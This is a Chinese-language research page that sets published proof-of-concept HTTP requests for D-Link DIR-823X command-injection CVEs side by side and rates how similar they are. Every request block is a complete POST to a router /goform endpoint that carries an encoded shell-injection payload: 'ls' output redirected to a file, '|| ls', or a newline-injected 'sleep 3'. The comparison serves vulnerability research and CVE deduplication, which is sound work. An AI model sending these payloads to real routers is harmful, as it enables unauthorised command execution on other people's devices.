---
layout: default
permalink: /DIR-823X.html
title: DIR-823X PoC 大块彩色对照
date: 2026-09-15
firmware: DIR-823X
source_note: "same file (repo root)"
tags:
  - IoT漏洞挖掘
  - CVE
  - PoC相似性
---

# DIR-823X PoC 大块彩色对照

> GitHub 兼容展示版：公共部分保留原文；<mark>黄色区域</mark>表示原 PoC 中的字段、接口、长度或载荷差异；🔴/🟠/🔵表示相似等级。每个请求块仍可直接选中复制，来源链接保持可点击。

> [!NOTE] 设备与版本
> D-Link DIR-823X 基准版本包括 240126、240802、250416；CVE-2026-1544 仅影响厂商已停止维护的产品（EOL）。


普通文字/边框：请求骨架和原始 PoC 来源高度一致。　<mark>黄色高亮：字段、接口或命令边界的原始变化。</mark>

## A 级：CVE-2025-11095 ↔ CVE-2025-11097

> [!CAUTION]
> 高度相似组；<mark>黄色高亮</mark>为原 PoC 中实际变化的字段、接口、长度或载荷。

<table border="0" cellpadding="0" cellspacing="16">
<tr>
<td valign="top">
<h3>CVE-2025-11095</h3>
<div>原始来源：<a href="https://github.com/n1ptune/dink/blob/main/delete_offline_device.md" target="_blank">n1ptune/dink 原始 PoC ↗</a>；<a href="https://nvd.nist.gov/vuln/detail/CVE-2025-11095" target="_blank">NVD ↗</a></div>
<pre>
POST /goform/<mark>delete_offline_device</mark> HTTP/1.1
Host: TARGET_HOST
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Cookie: sessionid=&lt;SESSIONID&gt;; token=&lt;TOKEN&gt;
Content-Length: &lt;按实际表单体计算&gt;
Connection: close
&nbsp;
<mark>delvalue=%27</mark>+%3B+ls+%2F+%3E+%2Ftmp%2Fls.log+%23&amp;token=&lt;TOKEN&gt;
</pre>
<div>变化：接口是 delete_offline_device；字段是 delvalue。</div>
</td>
<td valign="top">
<h3>CVE-2025-11097</h3>
<div>原始来源：<a href="https://github.com/n1ptune/dink/blob/main/set_device_name.md" target="_blank">n1ptune/dink 原始 PoC ↗</a>；<a href="https://nvd.nist.gov/vuln/detail/CVE-2025-11097" target="_blank">NVD ↗</a></div>
<pre>
POST /goform/<mark>set_device_name</mark> HTTP/1.1
Host: TARGET_HOST
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Cookie: sessionid=&lt;SESSIONID&gt;; token=&lt;TOKEN&gt;
Content-Length: &lt;按实际表单体计算&gt;
Connection: close
&nbsp;
<mark>mac=%27</mark>+%3B+ls+%2F+%3E+%2Ftmp%2Fls.log+%23&amp;token=&lt;TOKEN&gt;
</pre>
<div>变化：接口是 set_device_name；字段是 mac。</div>
</td>
</tr>
</table>

判定：载荷逐字相同，只把同一字符串从 delvalue 换到 mac，属于几乎完全重复的 PoC 模板。

来源：[CVE-2025-11095 原始请求](#CVE-2025-11095)、[CVE-2025-11097 原始请求](#CVE-2025-11097)。

## B 级：CVE-2025-11095 ↔ CVE-2025-11099

> [!WARNING]
> 请求骨架接近，但不能视为同一份 PoC。

<table border="0" cellpadding="0" cellspacing="16">
<tr>
<td valign="top">
<h3>CVE-2025-11095</h3>
<div>原始来源：<a href="https://github.com/n1ptune/dink/blob/main/delete_offline_device.md" target="_blank">n1ptune/dink 原始 PoC ↗</a>；<a href="https://nvd.nist.gov/vuln/detail/CVE-2025-11095" target="_blank">NVD ↗</a></div>
<pre>
POST /goform/<mark>delete_offline_device</mark> HTTP/1.1
Host: TARGET_HOST
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Cookie: sessionid=&lt;SESSIONID&gt;; token=&lt;TOKEN&gt;
Content-Length: &lt;按实际表单体计算&gt;
Connection: close
&nbsp;
<mark>delvalue=%27</mark>+%3B+ls+%2F+%3E+%2Ftmp%2Fls.log+%23&amp;token=&lt;TOKEN&gt;
</pre>
<div>公共重点：delvalue 字段、删除类 goform、命令写入日志。</div>
</td>
<td valign="top">
<h3>CVE-2025-11099</h3>
<div>原始来源：<a href="https://github.com/n1ptune/dink/blob/main/uci_del_in_delete_prohibiting.md" target="_blank">n1ptune/dink 原始 PoC ↗</a>；<a href="https://nvd.nist.gov/vuln/detail/CVE-2025-11099" target="_blank">NVD ↗</a></div>
<pre>
POST /goform/<mark>delete_prohibiting</mark> HTTP/1.1
Host: TARGET_HOST
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Cookie: sessionid=&lt;SESSIONID&gt;; token=&lt;TOKEN&gt;
Content-Length: &lt;按实际表单体计算&gt;
Connection: close
&nbsp;
<mark>delvalue=%7C%7C</mark>+ls+%23&amp;token=&lt;TOKEN&gt;
</pre>
<div>变化：接口是 delete_prohibiting；载荷边界从 ' ; … # 变为 || ls #。</div>
</td>
</tr>
</table>

<mark>判定：同字段、同删除类接口和同命令注入目的，属于明显相似的边界变体；没有把它标成逐字相同。</mark>

来源：[CVE-2025-11095 原始请求](#CVE-2025-11095)、[CVE-2025-11099 原始请求](#CVE-2025-11099)。

## A 级：CVE-2026-1544 ↔ CVE-2026-2063

> [!CAUTION]
> 高度相似组；<mark>黄色高亮</mark>为原 PoC 中实际变化的字段、接口、长度或载荷。

<table border="0" cellpadding="0" cellspacing="16">
<tr>
<td valign="top">
<h3>CVE-2026-1544</h3>
<div>原始来源：<a href="https://github.com/master-abc/cve/issues/16" target="_blank">master-abc/cve Issue 16 ↗</a>；<a href="https://nvd.nist.gov/vuln/detail/CVE-2026-1544" target="_blank">NVD ↗</a></div>
<pre>
POST /goform/<mark>set_mode</mark> HTTP/1.1
Host: TARGET_HOST
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Cookie: sessionid=&lt;SESSIONID&gt;; token=&lt;TOKEN&gt;
Content-Length: &lt;按实际表单体计算&gt;
Connection: close
&nbsp;
<mark>modeSelection</mark>=0&amp;proto=dhcp&amp;lan_ipaddr=192.168.1.1&amp;lan_netmask=255.255.255.0&amp;<mark>lan_gateway</mark>=192.168.1.1%22%0Asleep+3%0Aecho+%22&amp;set_flag=0&amp;token=&lt;TOKEN&gt;
</pre>
<div>变化：接口 set_mode；注入字段 lan_gateway。</div>
</td>
<td valign="top">
<h3>CVE-2026-2063</h3>
<div>原始来源：<a href="https://github.com/master-abc/cve/issues/19" target="_blank">master-abc/cve Issue 19 ↗</a>；<a href="https://nvd.nist.gov/vuln/detail/CVE-2026-2063" target="_blank">NVD ↗</a></div>
<pre>
POST /goform/<mark>set_ac_server</mark> HTTP/1.1
Host: TARGET_HOST
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Cookie: sessionid=&lt;SESSIONID&gt;; token=&lt;TOKEN&gt;
Content-Length: &lt;按实际表单体计算&gt;
Connection: close
&nbsp;
<mark>ac_server_mode</mark>=0&amp;<mark>ac_server</mark>=192.168.1.1%22%0Asleep+3%0Aecho+%22&amp;token=&lt;TOKEN&gt;
</pre>
<div>变化：接口 set_ac_server；注入字段 ac_server。</div>
</td>
</tr>
</table>

判定：时间型载荷 `192.168.1.1&quot; 换行 sleep 3 换行 echo &quot;` 逐字一致，只迁移到另一个配置字段。

来源：[CVE-2026-1544 原始请求](#CVE-2026-1544)、[CVE-2026-2063 原始请求](#CVE-2026-2063)。
